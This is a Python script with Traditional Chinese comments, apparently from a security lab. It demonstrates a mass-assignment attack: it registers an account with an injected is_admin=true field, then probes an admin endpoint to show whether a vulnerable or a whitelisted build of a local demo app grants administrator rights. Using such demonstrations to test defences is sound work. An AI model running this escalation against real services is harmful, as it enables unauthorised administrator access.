"""批量賦值提權攻擊腳本:註冊時偷塞 is_admin=true,再用管理端點驗證是否真的提權。

同一支腳本打 vulnerable 與 secure 兩版,靠管理端點的回應證明漏洞是否成立:
- vulnerable:body 被整包綁進記錄 → is_admin=true 生效 → 管理端點 200 → 提權成功。
- secure:白名單濾掉 is_admin → 權限仍是 False → 管理端點 403 → 攻擊失敗。
"""

import requests

REQUEST_TIMEOUT_SECONDS = 5


def run_mass_assignment_attack(base_url):
    """回傳 (是否提權成功, 說明字串)。是否提權成功=True 代表漏洞成立。"""
    # 註冊一個一般帳號,但在 body 裡多塞 is_admin=true。
    register = requests.post(
        f"{base_url}/api/register",
        json={
            "name": "Mallory",
            "email": "mallory@evil.com",
            "password": "pw",
            "is_admin": True,   # ← 攻擊者偷塞的敏感屬性
        },
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if register.status_code != 201:
        return False, f"註冊失敗(status={register.status_code}),環境異常"
    token = register.json()["token"]

    # 用拿到的令牌去打「只有管理員能用」的端點,實測是否真的提權。
    stats = requests.get(
        f"{base_url}/api/admin/stats",
        headers={"Authorization": f"Bearer {token}"},
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if stats.status_code == 200:
        return True, "提權成功!以偽造的 is_admin 讀到管理員機密統計資料"
    return False, f"管理端點被擋(status={stats.status_code}),白名單濾掉了 is_admin"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5021"
    escalated, message = run_mass_assignment_attack(target)
    print(("[漏洞成立] " if escalated else "[已防禦] ") + message)
